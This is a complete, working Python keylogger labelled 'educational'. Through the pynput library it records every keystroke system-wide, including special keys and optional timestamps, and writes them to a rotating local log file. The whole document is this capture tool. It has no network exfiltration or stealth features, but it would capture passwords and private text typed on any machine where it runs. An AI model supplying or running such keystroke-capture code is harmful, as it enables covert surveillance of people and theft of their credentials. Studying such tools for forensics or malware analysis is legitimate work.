"""
keylogger.py — Educational keystroke logger for forensics/malware-analysis study.

Usage:
    python keylogger.py [OPTIONS]

Options:
    --log <path>      Log file path (default: keylog.txt)
    --interval <sec>  Flush interval in seconds (default: 10)
    --max-size <kb>   Rotate log when it exceeds this size in KB (default: 512)
    --no-timestamps   Omit per-keystroke timestamps
    -h, --help        Show this help message

Requires:  pynput >= 1.7
           pip install pynput
"""

import argparse
import datetime
import os
import sys
import threading
import time

try:
    from pynput import keyboard
except ImportError:
    sys.exit(
        "[!] pynput not found. Install it with:  pip install pynput\n"
        "    Then re-run this script."
    )

# ---------------------------------------------------------------------------
# Formatting helpers
# ---------------------------------------------------------------------------

_SPECIAL_KEY_LABELS = {
    keyboard.Key.space:     " ",
    keyboard.Key.enter:     "\n[ENTER]\n",
    keyboard.Key.tab:       "[TAB]",
    keyboard.Key.backspace: "[BKSP]",
    keyboard.Key.delete:    "[DEL]",
    keyboard.Key.esc:       "[ESC]",
    keyboard.Key.caps_lock: "[CAPS]",
    keyboard.Key.shift:     "",        # modifier — skip
    keyboard.Key.shift_r:   "",
    keyboard.Key.ctrl_l:    "[CTRL]",
    keyboard.Key.ctrl_r:    "[CTRL]",
    keyboard.Key.alt_l:     "[ALT]",
    keyboard.Key.alt_r:     "[ALT]",
    keyboard.Key.cmd:       "[WIN]",
    keyboard.Key.up:        "[UP]",
    keyboard.Key.down:      "[DOWN]",
    keyboard.Key.left:      "[LEFT]",
    keyboard.Key.right:     "[RIGHT]",
    keyboard.Key.home:      "[HOME]",
    keyboard.Key.end:       "[END]",
    keyboard.Key.page_up:   "[PGUP]",
    keyboard.Key.page_down: "[PGDN]",
    keyboard.Key.f1:        "[F1]",
    keyboard.Key.f2:        "[F2]",
    keyboard.Key.f3:        "[F3]",
    keyboard.Key.f4:        "[F4]",
    keyboard.Key.f5:        "[F5]",
    keyboard.Key.f6:        "[F6]",
    keyboard.Key.f7:        "[F7]",
    keyboard.Key.f8:        "[F8]",
    keyboard.Key.f9:        "[F9]",
    keyboard.Key.f10:       "[F10]",
    keyboard.Key.f11:       "[F11]",
    keyboard.Key.f12:       "[F12]",
}


def format_key(key) -> str:
    """Return a human-readable string representation of a key event."""
    if isinstance(key, keyboard.KeyCode):
        # Regular printable character
        if key.char is not None:
            return key.char
        # Non-printable keycode with no char (e.g. some dead keys)
        return f"[{key.vk}]" if hasattr(key, "vk") else "[?]"
    # Special key
    return _SPECIAL_KEY_LABELS.get(key, f"[{key.name}]")


# ---------------------------------------------------------------------------
# Log file management
# ---------------------------------------------------------------------------

class LogManager:
    """Thread-safe rotating log writer."""

    def __init__(self, path: str, max_size_kb: int):
        self._path = path
        self._max_bytes = max_size_kb * 1024
        self._lock = threading.Lock()
        self._buf: list[str] = []
        self._session_start = datetime.datetime.now().isoformat(timespec="seconds")
        self._write_header()

    def _write_header(self) -> None:
        with open(self._path, "a", encoding="utf-8") as f:
            f.write(
                f"\n{'='*60}\n"
                f"Session started: {self._session_start}\n"
                f"{'='*60}\n"
            )

    def append(self, text: str) -> None:
        with self._lock:
            self._buf.append(text)

    def flush(self) -> None:
        with self._lock:
            if not self._buf:
                return
            chunk = "".join(self._buf)
            self._buf.clear()

        self._rotate_if_needed()
        with open(self._path, "a", encoding="utf-8") as f:
            f.write(chunk)

    def _rotate_if_needed(self) -> None:
        try:
            if os.path.getsize(self._path) >= self._max_bytes:
                ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                archive = f"{self._path}.{ts}"
                os.rename(self._path, archive)
                self._write_header()
        except OSError:
            pass


# ---------------------------------------------------------------------------
# Listener
# ---------------------------------------------------------------------------

class Keylogger:
    def __init__(self, log_path: str, flush_interval: float,
                 max_size_kb: int, timestamps: bool):
        self._log = LogManager(log_path, max_size_kb)
        self._interval = flush_interval
        self._timestamps = timestamps
        self._listener: keyboard.Listener | None = None
        self._flush_thread: threading.Thread | None = None
        self._stop_event = threading.Event()

    # -- Internal callbacks --------------------------------------------------

    def _on_press(self, key) -> None:
        char = format_key(key)
        if not char:
            return
        if self._timestamps:
            ts = datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3]
            self._log.append(f"[{ts}]{char}")
        else:
            self._log.append(char)

    def _flush_loop(self) -> None:
        while not self._stop_event.is_set():
            time.sleep(self._interval)
            self._log.flush()

    # -- Public API ----------------------------------------------------------

    def start(self) -> None:
        self._flush_thread = threading.Thread(
            target=self._flush_loop, daemon=True, name="flusher"
        )
        self._flush_thread.start()

        self._listener = keyboard.Listener(on_press=self._on_press)
        self._listener.start()
        print(f"[*] Logging keystrokes — press Ctrl+C to stop")

    def stop(self) -> None:
        self._stop_event.set()
        if self._listener:
            self._listener.stop()
        self._log.flush()          # write remaining buffer
        print("\n[*] Logger stopped. Log written.")

    def join(self) -> None:
        if self._listener:
            self._listener.join()


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Educational keystroke logger (pynput-based)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("--log",          default="keylog.txt",
                   help="Output log file (default: keylog.txt)")
    p.add_argument("--interval",     type=float, default=10.0,
                   help="Flush interval in seconds (default: 10)")
    p.add_argument("--max-size",     type=int, default=512,
                   help="Rotate log at this size in KB (default: 512)")
    p.add_argument("--no-timestamps", action="store_true",
                   help="Omit timestamps from each key entry")
    return p.parse_args()


def main() -> None:
    args = parse_args()
    logger = Keylogger(
        log_path=args.log,
        flush_interval=args.interval,
        max_size_kb=args.max_size,
        timestamps=not args.no_timestamps,
    )
    logger.start()
    try:
        logger.join()
    except KeyboardInterrupt:
        logger.stop()


if __name__ == "__main__":
    main()
